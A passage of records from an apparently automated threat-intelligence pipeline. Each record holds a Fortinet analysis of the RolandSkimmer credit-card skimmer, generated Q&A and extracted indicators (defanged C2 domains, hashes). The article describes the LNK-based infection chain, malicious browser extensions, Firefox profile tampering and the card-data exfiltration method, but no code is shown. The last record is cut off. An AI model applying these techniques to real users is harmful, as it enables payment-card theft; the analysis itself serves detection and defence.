background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["malicious", "banking trojan", "apt", "phishing", "analysis", "bank", "botnet", "intelligence", "browser", "threat"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and social engineering, to harvest and exfiltrate sensitive financial data from affected users. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this threat is high, as it can lead to the theft of sensitive credit card information, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["bank", "browser", "malicious", "apt", "analysis", "threat", "intelligence", "phishing", "banking trojan", "botnet"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to 